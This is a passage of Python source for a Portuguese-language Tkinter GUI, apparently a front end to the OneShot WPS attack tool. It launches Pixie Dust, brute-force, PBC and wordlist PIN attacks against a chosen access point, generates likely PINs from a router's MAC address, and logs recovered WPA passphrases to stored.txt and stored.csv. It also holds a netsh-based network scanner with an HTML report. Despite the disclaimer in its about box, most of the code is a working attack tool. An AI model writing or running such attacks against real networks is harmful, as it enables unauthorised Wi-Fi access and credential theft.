                        '{} dBm'.format(level), pwr_bar,
                        net.get('Device name', ''),
                        '{} {}'.format(net.get('Model', ''), net.get('Model number', '')).strip(),
                        locked_str),
                tags=(tag_signal, locked_tag))
        self.log('Fim da varredura. {} alvos WPS encontrados.'.format(len(networks)), 'success')

    def _clear_tree(self):
        for item in self.tree.get_children(): self.tree.delete(item)

    def _on_select_network(self, event):
        selection = self.tree.selection()
        if selection:
            item = self.tree.item(selection[0])
            self.selected_bssid = item['values'][0]
            self.var_pin.set("")
            self.log('Rede Selecionada: {} | SSID: {}'.format(self.selected_bssid, item['values'][1]), 'info')

    def _start_attack(self):
        iface = self.var_interface.get().strip()
        if not iface:
            messagebox.showerror('Erro', 'Insira uma interface sem fios ativa.')
            return
        if not self.selected_bssid:
            selection = self.tree.selection()
            if selection:
                self.selected_bssid = self.tree.item(selection[0])['values'][0]
            else:
                messagebox.showerror('Erro', 'Selecione um ponto de acesso da lista antes de atacar.')
                return
        if self._running:
            messagebox.showwarning('Aviso', 'Um ataque já está sendo executado.')
            return

        self._running = True
        self.btn_attack.config(state=tk.DISABLED, text='Ataque Ativo...')
        self.btn_stop.config(state=tk.NORMAL)   
        
        pin = self.var_pin.get().strip() or None
        try:
            delay = float(self.var_delay.get()) if self.var_delay.get() else 0
        except ValueError:
            delay = 0
        pixie = self.var_pixie.get()
        brute = self.var_bruteforce.get()
        pbc = self.var_pbc.get()
        use_wordlist = self.var_wordlist.get()

        self.attack_thread = threading.Thread(target=self._do_attack,
            args=(iface, self.selected_bssid, pin, pixie, brute, pbc, delay, use_wordlist), daemon=True)
        self.attack_thread.start()

    def _do_attack(self, iface, bssid, pin, pixie, brute, pbc, delay, use_wordlist):
        try:
            if IS_LINUX:
                self.log('Levantando interface {}...'.format(iface))
                if not ifaceUp(iface):
                    self.log('Falha grave ao levantar a interface de rede.', 'error')
                    self.result_queue.put(('done', None))
                    return
            self.log('Iniciando auditoria no alvo {}'.format(bssid), 'highlight')
            self.companion = Companion(iface, callback_log=lambda m, l: self.log(m, l), bssid=bssid)

            if use_wordlist and self.wordlist_pins:
                for idx, wl_pin in enumerate(self.wordlist_pins):
                    if not self._running: break
                    self.log('Tentativa [{}/{}] PIN: {}'.format(idx+1, len(self.wordlist_pins), wl_pin), 'info')
                    result = self.companion.single_connection(bssid, wl_pin, pixiemode=False)
                    if result:
                        self.result_queue.put(('success', result))
                        if self.var_save.get(): self._save_creds(result)
                        self.result_queue.put(('done', None))
                        return
                    if delay > 0: time.sleep(delay)
                self.log('Esgotados os PIN da Wordlist.', 'error')
                self.result_queue.put(('done', None))
                return
            elif brute:
                result = self.companion.single_connection(bssid, pin, pixiemode=True)
            elif pbc:
                result = self.companion.single_connection(bssid, pbc_mode=True)
            else:
                if not pin:
                    suggested = self.companion.generate_pins_list(bssid)
                    if suggested:
                        pin = suggested[0]['pin']
                        self.log('Usando PIN recomendado: {} ({})'.format(pin, suggested[0]['name']), 'highlight')
                result = self.companion.single_connection(bssid, pin, pixiemode=pixie,
                    showpixiecmd=self.var_show_cmd.get(), pixieforce=self.var_pixie_force.get())
            if result:
                self.result_queue.put(('success', result))
                if self.var_save.get(): self._save_creds(result)
            else:
                self.result_queue.put(('fail', None))
        except Exception as e:
            self.log('Erro de execução: {}'.format(str(e)), 'error')
            self.result_queue.put(('done', None))
        finally:
            if self.companion: 
                self.companion.cleanup()
                self.companion = None
            self.result_queue.put(('done', None))

    def _process_result(self, result):
        status, data = result
        if status == 'success':
            self._show_result_success(data)
        elif status == 'fail':
            self._show_result_fail()
        self._running = False
        self.btn_attack.config(state=tk.NORMAL, text='[ INICIAR ATAQUE WPS ]')
        self.btn_stop.config(state=tk.DISABLED)

    def _stop_attack(self):
        self._running = False
        if self.companion: self.companion.stop()
        self.log('Auditoria cancelada manualmente pelo usuário.', 'warning')
        self.btn_attack.config(state=tk.NORMAL, text='[ INICIAR ATAQUE WPS ]')
        self.btn_stop.config(state=tk.DISABLED)

    def _save_creds(self, data):
        try:
            if not os.path.exists(self.reports_dir): os.makedirs(self.reports_dir)
            filename = os.path.join(self.reports_dir, 'stored')
            date_str = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
            bssid = data.get('bssid', '?')
            essid = data.get('essid', '?')
            pin = data.get('pin', '?')
            psk = data.get('psk', '?')
            
            with open(filename + '.txt', 'a', encoding='utf-8') as f:
                f.write('Data: {}\nBSSID: {}\nSSID: {}\nPIN WPS: {}\nSenha: {}\n\n'.format(date_str, bssid, essid, pin, psk))
                
            write_header = not os.path.isfile(filename + '.csv')
            with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
                writer = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
                if write_header: 
                    writer.writerow(['Data', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
                writer.writerow([date_str, bssid, essid, pin, psk])
            self.log('Dados adicionados em stored.txt / stored.csv', 'success')
        except Exception as e:
            self.log('Falha na escrita local: {}'.format(str(e)), 'error')

    def _export_stored_csv(self):
        filename = os.path.join(self.reports_dir, 'stored.csv')
        if not os.path.exists(filename):
            messagebox.showinfo('Auditoria', 'Ainda sem histórico disponível para exportação.')
            return
        dest = filedialog.asksaveasfilename(defaultextension='.csv', filetypes=[('CSV Comma Separated', '*.csv')])
        if dest:
            try:
                shutil.copy(filename, dest)
                messagebox.showinfo('Concluído', 'Histórico exportado perfeitamente.')
            except Exception as e:
                messagebox.showerror('Erro', str(e))

    def _load_wordlist(self):
        fname = filedialog.askopenfilename(title='Carregar Wordlist de PIN WPS',
            filetypes=[('Arquivos de Texto', '*.txt'), ('Todos', '*.*')])
        if not fname: return
        try:
            with open(fname, 'r') as f: lines = f.read().splitlines()
            self.wordlist_pins = []
            for line in lines:
                pin = line.strip()
                if pin.isdigit() and len(pin) in (4, 8):
                    self.wordlist_pins.append(pin)
                elif pin.isdigit() and len(pin) == 7:
                    from_wps = WPSpin()
                    cs = from_wps.checksum(int(pin))
                    self.wordlist_pins.append(pin + str(cs))
            self.wordlist_index = 0
            self.var_wordlist.set(True)
            self.log('Wordlist com {} PIN carregada.'.format(len(self.wordlist_pins)), 'success')
            if self.wordlist_pins: self.var_pin.set(self.wordlist_pins[0])
        except Exception as e:
            self.log('Erro ao ler wordlist: {}'.format(str(e)), 'error')

    def _show_result_success(self, result):
        self.log("=" * 60, "con_header")
        self.log("[+] PROCESSO DE AUDITORIA FINALIZADO COM SUCESSO!", "success")
        self.log("=" * 60, "con_header")
        self.log("SSID (Rede): {}".format(result.get('essid', '?')), "con_ssid")
        self.log("BSSID (MAC): {}".format(result.get('bssid', '?')), "con_bssid")
        self.log("WPS PIN: {}".format(result.get('pin', '?')), "con_pin")
        self.log("SENHA WPA: {}".format(result.get('psk', '?')), "con_key")
        self.log("=" * 60, "con_header")

    def _show_result_fail(self):
        self.log('Ataque finalizado. Ponto de acesso resistente a esta técnica.', 'error')

    def _manual_pin_gen(self):
        win = tk.Toplevel(self.root)
        win.title('Gerador Autônomo de PIN WPS')
        win.geometry('780x680')
        win.configure(bg=BG_MAIN)

        frame = ttk.Frame(win, padding=15)
        frame.pack(fill=tk.BOTH, expand=True)

        ttk.Label(frame, text='MAC do ponto de acesso (ex: AA:BB:CC:11:22:33):').pack(anchor=tk.W, pady=2)
        bssid_var = tk.StringVar()
        if self.selected_bssid: bssid_var.set(self.selected_bssid)
        entry_bssid = ttk.Entry(frame, textvariable=bssid_var, width=28, font=('Consolas', 11))
        entry_bssid.pack(fill=tk.X, pady=5)

        result_frame = ttk.Frame(frame)
        result_frame.pack(fill=tk.BOTH, expand=True, pady=10)

        text_pins = tk.Text(result_frame, font=('Consolas', 10), bg=BG_MAIN, fg=TEXT_LIGHT,
                            relief=tk.FLAT, wrap=tk.WORD, padx=5, pady=5,
                            highlightthickness=0, insertbackground=GREEN_BRIGHT)
        scroll_pins = ttk.Scrollbar(result_frame, orient=tk.VERTICAL, command=text_pins.yview)
        text_pins.configure(yscrollcommand=scroll_pins.set)
        scroll_pins.pack(side=tk.RIGHT, fill=tk.Y)
        text_pins.pack(fill=tk.BOTH, expand=True)

        text_pins.tag_configure('pin_item', foreground='#ce9178')
        text_pins.tag_configure('pin_name', foreground=GREEN_PRIMARY)
        text_pins.tag_configure('pin_val', foreground=GREEN_BRIGHT, font=('Consolas', 11, 'bold'))

        def generate():
            bssid = bssid_var.get().strip().upper()
            if not bssid:
                messagebox.showerror('Erro', 'Insira o BSSID para processamento.')
                return
            bssid = bssid.replace('-', ':').replace('.', ':')
            if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', bssid):
                messagebox.showerror('Erro', 'Formato de MAC inválido.')
                return
            text_pins.delete(1.0, tk.END)
            generator = WPSpin()
            pins = generator.getAll(bssid, get_static=True)
            text_pins.insert(tk.END, 'Relatório de PIN válidos para {}\n\n'.format(bssid), 'pin_name')
            suggested_ids = [s['id'] for s in generator.getSuggested(bssid)]
            for p in pins:
                is_suggested = p['id'] in suggested_ids
                prefix = '[RECOMENDADO] ' if is_suggested else '             '
                name = p['name']; pin_val = p['pin']
                tag = 'pin_val' if is_suggested else 'pin_item'
                text_pins.insert(tk.END, '{} {}\n'.format(prefix, name), 'pin_name')
                text_pins.insert(tk.END, '{}      PIN: {}\n\n'.format(' ' * 13, pin_val), tag)
            text_pins.see(1.0)

        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill=tk.X, pady=5)
        
        ttk.Button(btn_frame, text='Gerar PIN', command=generate).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text='Copiar tudo', command=lambda: self._copy_pins(text_pins)).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text='Exportar lista para .txt', command=lambda: self._export_pins_dialog(bssid_var.get())).pack(side=tk.LEFT, padx=5)

    def _copy_pins(self, text_widget):
        content = text_widget.get(1.0, tk.END).strip()
        self.root.clipboard_clear()
        self.root.clipboard_append(content)
        self.log('Informações copiadas para a área de transferência.', 'success')

    def _export_pins_dialog(self, bssid):
        bssid_clean = bssid.strip().replace(':', '').replace('-', '')
        if not bssid_clean:
            messagebox.showwarning('Aviso', 'MAC inexistente para exportar.')
            return
        fname = filedialog.asksaveasfilename(defaultextension='.txt',
                                             filetypes=[('Arquivos de Texto', '*.txt')],
                                             initialfile=f"pin_{bssid_clean}.txt")
        if fname:
            try:
                pins = WPSpin().getAll(bssid, get_static=True)
                with open(fname, 'w', encoding='utf-8') as f:
                    for p in pins:
                        f.write(f"{p['pin']}\n")
                self.log('Arquivo com PIN gerado.', 'success')
            except Exception as e:
                self.log('Erro de escrita: {}'.format(str(e)), 'error')

    def win_scan(self):
        self.win_var_total_ssids.set("REDES DISPONÍVEIS: ...")
        self.win_var_total_bssids.set("BSSIDs (PONTOS): ...")
        self.win_var_total_open.set("SEM SENHA (ABERTAS): ...")
        self.win_var_best_signal.set("MELHOR INTENSIDADE: ...")
        
        thread = threading.Thread(target=self._win_scan_worker, daemon=True)
        thread.start()

    def _win_scan_worker(self):
        if not IS_WINDOWS:
            self.root.after(0, lambda: messagebox.showwarning(
                "Aviso", "O scanner NETSH só é suportado nativamente no Windows."
            ))
            return

        try:
            creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
            result = subprocess.run(["netsh", "wlan", "show", "networks", "mode=bssid"],
                                    capture_output=True, creationflags=creationflags, timeout=15)
            
            raw = result.stdout
            for encoding in ("cp850", "cp1252", "utf-8"):
                try:
                    text = raw.decode(encoding)
                    break
                except Exception:
                    text = raw.decode(encoding, errors="replace")

            if result.returncode != 0:
                err = result.stderr.decode("cp850", errors="replace")
                raise RuntimeError(err.strip() or "O utilitário netsh falhou no retorno.")

            networks = self._win_parse_netsh(text)
            self.root.after(0, lambda res=networks: self._win_update_gui_results(res))
        except Exception as e:
            err_msg = str(e)
            self.root.after(0, lambda msg=err_msg: messagebox.showerror("Erro de Coleta", msg))

    def _win_parse_netsh(self, text):
        networks = []
        current_ssid = None
        current_network = None

        for raw_line in text.splitlines():
            line = raw_line.strip()
            if not line: continue

            match = re.match(r"SSID\s+\d+\s*:\s*(.*)$", line, re.I)
            if match:
                current_ssid = match.group(1).strip()
                if not current_ssid: 
                    current_ssid = "<SSID Oculto>"
                continue

            match = re.match(r"BSSID\s+\d+\s*:\s*(.+)$", line, re.I)
            if match and current_ssid is not None:
                current_network = {
                    "ssid": current_ssid, "bssid": match.group(1).strip().upper(), "signal": "",
                    "radio": "", "channel": "", "auth": "", "crypto": "",
                    "basic_rates": "", "other_rates": "", "rates": ""
                }
                networks.append(current_network)
                continue

            if current_network is None: continue
            norm_line = line.lower()

            if norm_line.startswith(("sinal", "signal")):
                sig_match = re.search(r"(\d+)\s*%", line)
                if sig_match:
                    current_network["signal"] = sig_match.group(1) + "%"
            elif norm_line.startswith(("tipo de r", "radio type")):
                if ":" in line: current_network["radio"] = line.split(":", 1)[1].strip()
            elif norm_line.startswith(("canal", "channel")):
                if ":" in line: current_network["channel"] = line.split(":", 1)[1].strip()
            elif norm_line.startswith(("autentica", "authentication")):
                if ":" in line: current_network["auth"] = line.split(":", 1)[1].strip()
            elif norm_line.startswith(("criptografia", "encryption")):
                if ":" in line: current_network["crypto"] = line.split(":", 1)[1].strip()
            elif norm_line.startswith(("taxas b", "basic rates")):
                if ":" in line: current_network["basic_rates"] = line.split(":", 1)[1].strip()
            elif norm_line.startswith(("outras taxas", "other rates")):
                if ":" in line: current_network["other_rates"] = line.split(":", 1)[1].strip()

        for net in networks:
            b = net["basic_rates"]
            o = net["other_rates"]
            if b and o: net["rates"] = f"{b} | {o}"
            elif b: net["rates"] = b
            else: net["rates"] = o

        networks.sort(key=lambda n: self._win_get_signal_value(n["signal"]), reverse=True)
        return networks

    @staticmethod
    def _win_get_signal_value(signal_str):
        try: return int(re.search(r"\d+", signal_str).group())
        except Exception: return 0

    def _win_update_gui_results(self, networks):
        self.win_networks = networks
        self.win_apply_filter()

        total_ssids = len(set(n["ssid"] for n in self.win_networks))
        total_bssids = len(self.win_networks)
        
        total_open = sum(1 for n in self.win_networks if n["auth"].lower() in ("abrir", "open", "none"))
        best_sig = self.win_networks[0]["signal"] if self.win_networks else "--"

        self.win_var_total_ssids.set(f"REDES DISPONÍVEIS: {total_ssids}")
        self.win_var_total_bssids.set(f"BSSIDs (PONTOS): {total_bssids}")
        self.win_var_total_open.set(f"SEM SENHA (ABERTAS): {total_open}")
        self.win_var_best_signal.set(f"MELHOR INTENSIDADE: {best_sig}")

    def win_apply_filter(self):
        term = self.var_win_filter.get().strip().lower()
        if not term:
            self.win_filtered_networks = list(self.win_networks)
        else:
            self.win_filtered_networks = [
                n for n in self.win_networks
                if term in n["ssid"].lower() or term in n["bssid"].lower() or term in n["auth"].lower() or term in n["channel"].lower()
            ]

        self.win_filtered_networks.sort(key=lambda n: self._win_get_signal_value(n["signal"]), reverse=True)
        
        for item in self.win_tree.get_children(): 
            self.win_tree.delete(item)

        for idx, net in enumerate(self.win_filtered_networks, start=1):
            sig = self._win_get_signal_value(net["signal"])
            if sig >= 80: tag = "excellent"
            elif sig >= 60: tag = "good"
            elif sig >= 40: tag = "medium"
            elif sig >= 20: tag = "weak"
            else: tag = "bad"

            if net["auth"].lower() in ("abrir", "open", "none"):
                tag = "open_network"

            self.win_tree.insert(
                "", "end", iid=str(idx - 1),
                values=(idx, net["ssid"], net["bssid"], net["signal"], net["radio"], net["channel"], net["auth"], net["crypto"], net["rates"]),
                tags=(tag,)
            )

    def win_sort_by_column(self, col):
        if col == "signal":
            self.win_filtered_networks.sort(key=lambda n: self._win_get_signal_value(n["signal"]), reverse=True)
        elif col == "ssid":
            self.win_filtered_networks.sort(key=lambda n: n["ssid"].lower())
        elif col == "channel":
            self.win_filtered_networks.sort(key=lambda n: int(n["channel"]) if n["channel"].isdigit() else 999)
        self._win_render_list()

    def _win_render_list(self):
        for item in self.win_tree.get_children(): 
            self.win_tree.delete(item)
        for idx, net in enumerate(self.win_filtered_networks, start=1):
            sig = self._win_get_signal_value(net["signal"])
            if sig >= 80: tag = "excellent"
            elif sig >= 60: tag = "good"
            elif sig >= 40: tag = "medium"
            elif sig >= 20: tag = "weak"
            else: tag = "bad"
            self.win_tree.insert("", "end", iid=str(idx - 1),
                                 values=(idx, net["ssid"], net["bssid"], net["signal"], net["radio"], net["channel"], net["auth"], net["crypto"], net["rates"]),
                                 tags=(tag,))

    def win_show_details(self, _=None):
        sel = self.win_tree.selection()
        if not sel: return
        item = self.win_tree.item(sel[0])
        vals = item.get('values')
        if not vals or len(vals) < 9: return
        self.win_var_details.set(
            f"> SSID: {vals[1]}  |  MAC: {vals[2]}  |  Sinal: {vals[3]}  |  Canal: {vals[5]}  |  Padrão: {vals[4]}\n"
            f"> Autenticação: {vals[6]}  |  Cripto: {vals[7]}  |  Taxas Máx: {vals[8]}"
        )

    def win_copy_selected(self):
        sel = self.win_tree.selection()
        if not sel:
            messagebox.showinfo("Cópia", "Selecione uma célula para extrair os dados.")
            return
        item = self.win_tree.item(sel[0])
        vals = item.get('values')
        if not vals or len(vals) < 9: return
        text = (
            f"SSID: {vals[1]}\nBSSID: {vals[2]}\nSinal: {vals[3]}\n"
            f"Canal: {vals[5]}\nAutenticação: {vals[6]}\nCriptografia: {vals[7]}\n"
            f"Padrão Rádio: {vals[4]}\nTaxas: {vals[8]}"
        )
        self.root.clipboard_clear()
        self.root.clipboard_append(text)
        self.root.update()
        self.status_bar.config(text="[+] Telemetria da célula Wi-Fi copiada para área de transferência.")

    

    

    def win_export_html(self):
        if not self.win_networks:
            messagebox.showinfo("Aviso", "Execute um scan NETSH antes de gerar relatórios.")
            return

        path = filedialog.asksaveasfilename(
            title="Salvar Relatório de Auditoria Wi-Fi",
            defaultextension=".html",
            filetypes=[("Documento HTML", "*.html")],
            initialfile="wifi_audit_report.html"
        )
        if not path: return

        total_ssids = len(set(n["ssid"] for n in self.win_networks))
        total_bssids = len(self.win_networks)
        total_open = sum(1 for n in self.win_networks if n["auth"].lower() in ("abrir", "open", "none"))
        best_sig = self.win_networks[0]["signal"] if self.win_networks else "--"
        best_ssid = self.win_networks[0]["ssid"] if self.win_networks else "--"
        generated_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

        rows = []
        for idx, net in enumerate(self.win_networks, start=1):
            sig_num = self._win_get_signal_value(net["signal"])
            if sig_num >= 80: sig_class = "excellent"
            elif sig_num >= 60: sig_class = "good"
            elif sig_num >= 40: sig_class = "medium"
            elif sig_num >= 20: sig_class = "weak"
            else: sig_class = "bad"

            # Identifica se é rede aberta
            is_open = net["auth"].lower() in ("abrir", "open", "none")
            open_row_class = "open-row" if is_open else ""

            rows.append(f"""
            <tr class="{open_row_class}">
                <td class="rank">#{idx}</td>
                <td class="ssid">{escape(net["ssid"])}</td>
                <td>{escape(net["bssid"])}</td>
                <td><span class="signal {sig_class}">{escape(net["signal"])}</span></td>
                <td>{escape(net["radio"])}</td>
                <td>{escape(net["channel"])}</td>
                <td class="auth-col">{escape(net["auth"])}</td>
                <td>{escape(net["crypto"])}</td>
                <td>{escape(net["rates"])}</td>
            </tr>
            """)

        html_doc = f"""<!DOCTYPE html>
    <html lang="pt-BR">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Audit Report // Terminal Visual</title>
    <style>
        * {{ box-sizing: border-box; }}
        body {{
            margin: 0; padding: 30px; min-height: 100vh;
            background: radial-gradient(circle at top, #0b2410 0%, #000000 70%, #000000 100%);
            color: #b8ffb8; font-family: 'Consolas', 'Courier New', monospace;
        }}
        .container {{ width: 100%; max-width: 1550px; margin: 0 auto; }}
        .terminal {{
            border: 1px solid #00ff41; background: rgba(3, 10, 4, .97);
            box-shadow: 0 0 20px rgba(0, 255, 65, .2), inset 0 0 50px rgba(0, 255, 65, .05);
        }}
        .topbar {{
            padding: 22px 25px; border-bottom: 1px solid #007a20;
            display: flex; align-items: center; justify-content: space-between; gap: 20px; flex-wrap: wrap;
        }}
        .title {{ color: #00ff41; font-size: 26px; font-weight: bold; letter-spacing: 1px; }}
        .subtitle {{ margin-top: 5px; color: #00b82e; font-size: 12px; }}
        .date {{ color: #00e5ff; font-size: 12px; }}
        .stats {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; padding: 15px; border-bottom: 1px solid #0d3015; }}
        .stat {{ padding: 16px; background: #071007; border: 1px solid #0d3015; }}
        .stat-label {{ color: #007a20; font-size: 10px; margin-bottom: 8px; letter-spacing: 1px; }}
        .stat-value {{ color: #00ff41; font-size: 22px; font-weight: bold; }}
        .stat-strongest {{ color: #00e5ff; }}
        .table-wrap {{ padding: 15px; overflow-x: auto; }}
        table {{ width: 100%; min-width: 1100px; border-collapse: collapse; font-size: 12px; }}
        th {{ padding: 12px 9px; text-align: left; background: #071a0a; color: #00ff41; border: 1px solid #0d3015; }}
        td {{ padding: 11px 9px; color: #b8ffb8; border: 1px solid #0d3015; }}
        tr:nth-child(even) {{ background: rgba(7, 26, 10, .35); }}
        tr:hover {{ background: rgba(0, 255, 65, .1); }}

        /* =======================================================
        ESTILO PARA A LINHA INTEIRA AZUL QUANDO A REDE FOR ABERTA
        ======================================================= */
        tr.open-row {{
            background: rgba(0, 180, 255, 0.10) !important;
        }}
        tr.open-row:hover {{
            background: rgba(0, 180, 255, 0.20) !important;
        }}
        tr.open-row td {{
            color: #00e5ff !important;
            border-color: rgba(0, 229, 255, 0.25) !important;
            text-shadow: 0 0 5px rgba(0, 229, 255, 0.4);
        }}
        tr.open-row td.rank,
        tr.open-row td.ssid,
        tr.open-row td.auth-col {{
            color: #00e5ff !important;
            font-weight: bold;
        }}
        tr.open-row .signal {{
            color: #00e5ff !important;
            border-color: #00e5ff !important;
            box-shadow: 0 0 8px rgba(0, 229, 255, 0.4) !important;
        }}

        /* Estilos normais */
        .rank {{ color: #00ff41; font-weight: bold; }}
        .ssid {{ color: #ffffff; font-weight: bold; }}
        .signal {{ display: inline-block; min-width: 60px; padding: 4px 8px; text-align: center; font-weight: bold; border: 1px solid currentColor; }}
        .excellent {{ color: #00ff41; box-shadow: 0 0 8px rgba(0, 255, 65, .2); }}
        .good {{ color: #66ff66; }}
        .medium {{ color: #ffff00; }}
        .weak {{ color: #ff9900; }}
        .bad {{ color: #ff3333; }}
        
        .footer {{ padding: 15px 20px; border-top: 1px solid #007a20; color: #007a20; text-align: center; font-size: 11px; }}
        @media (max-width: 850px) {{
            body {{ padding: 10px; }}
            .stats {{ grid-template-columns: 1fr 1fr; }}
        }}
    </style>
    </head>
    <body>
    <div class="container">
    <div class="terminal">
        <div class="topbar">
            <div>
                <div class="title">&gt; WI-FI NETWORK TELEMETRY V2</div>
                <div class="subtitle">[ ESTADOS NETSH CAPTURADOS ] [ ORDENAÇÃO POR INTENSIDADE ]</div>
            </div>
            <div class="date">RELATÓRIO EM: {escape(generated_date)}</div>
        </div>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-label">REDES ÚNICAS</div>
                <div class="stat-value">{total_ssids}</div>
            </div>
            <div class="stat">
                <div class="stat-label">PONTOS DE ACESSO (BSSIDs)</div>
                <div class="stat-value">{total_bssids}</div>
            </div>
            <div class="stat">
                <div class="stat-label">REDES ABERTAS (SEM SENHA)</div>
                <div class="stat-value" style="color: #00e5ff;">{total_open}</div>
            </div>
            <div class="stat">
                <div class="stat-label">MELHOR SINAL</div>
                <div class="stat-value stat-strongest">{escape(best_sig)}</div>
                <div class="subtitle">{escape(best_ssid)}</div>
            </div>
        </div>

        <div class="table-wrap">
            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>SSID / REDE</th>
                        <th>BSSID (MAC)</th>
                        <th>SINAL</th>
                        <th>RÁDIO</th>
                        <th>CANAL</th>
                        <th>AUTENTICAÇÃO</th>
                        <th>CRIPTOGRAFIA</th>
                        <th>TAXAS Mbps</th>
                    </tr>
                </thead>
                <tbody>
                    {"".join(rows)}
                </tbody>
            </table>
        </div>
        <div class="footer">WIFI NETSH SCANNER // HACKER EDITION TERMINAL REPORT</div>
    </div>
    </div>
    </body>
    </html>
    """
        try:
            with open(path, "w", encoding="utf-8") as f:
                f.write(html_doc)
            messagebox.showinfo("Sucesso", f"Relatório gerado em:\n{path}")
        except Exception as e:
            messagebox.showerror("Erro de Escrita", str(e))

    def _poll_queues(self):
        try:
            while True:
                msg, level = self.log_queue.get_nowait()
                self._process_log(msg, level)
        except queue.Empty: pass

        try:
            data = self.scan_queue.get_nowait()
            self._process_scan_tab1(data)
        except queue.Empty: pass

        try:
            result = self.result_queue.get_nowait()
            if result[0] == 'done':
                self._running = False
                self.btn_attack.config(state=tk.NORMAL, text='[ INICIAR ATAQUE WPS ]')
                self.btn_stop.config(state=tk.DISABLED)
            else:
                self._process_result(result)
        except queue.Empty: pass

        self.root.after(100, self._poll_queues)

    def _auto_run_initial_checks(self):
        if IS_WINDOWS:
            self.notebook.select(self.tab_win_scan)
            self.win_scan()
        else:
            self.notebook.select(self.tab_wps)

    def _show_about(self):
        messagebox.showinfo('Sobre a Suíte',
            'WPS Attack Pin Tool & Network Telemetry Suite\n'
            'Versão 2.5 — Green Hacker Edition\n\n'
            'Desenvolvido para auditoria e testes profissionais de penetração de rede.\n'
            'O uso destas ferramentas é estritamente educacional e sob consentimento prévio.')

    def _on_close(self):
        if self._running:
            if not messagebox.askyesno('Confirmação', 'Existe uma auditoria ativa no momento. Deseja sair mesmo assim?'): 
                return
            self._stop_attack()
        if self.companion: 
            self.companion.cleanup()
        self.root.destroy()

def ifaceUp(iface, down=False):
    if not IS_LINUX: return False
    action = 'down' if down else 'up'
    return subprocess.run('ip link set {} {}'.format(iface, action), shell=True).returncode == 0

def check_dependencies():
    if IS_LINUX:
        missing = []
        for cmd in ['iw', 'wpa_supplicant', 'pixiewps']:
            if subprocess.run('which {}'.format(cmd), shell=True, stdout=subprocess.DEVNULL).returncode != 0:
                missing.append(cmd)
        if missing:
            sys.stderr.write('[ALERTA] Os utilitários a seguir não foram identificados: {}\n'.format(', '.join(missing)))
            sys.stderr.write('Instale-os usando: apt install iw wpaspy pixiewps\n')

if __name__ == '__main__':
    if sys.hexversion < 0x03060F0:
        sys.stderr.write('Esta ferramenta exige recursos mínimos do Python 3.6 ou superior.\n')
        sys.exit(1)
        
    if IS_LINUX and os.getuid() != 0:
        sys.stderr.write(colorize('[!] Esta suite de ferramentas necessita de privilégios elevados de ROOT para rodar no Linux.\n', ANSI_RED, bold=True))
        sys.exit(1)
        
    check_dependencies()
    
    root = tk.Tk()
    app = OneShotGUI(root)
    root.mainloop()
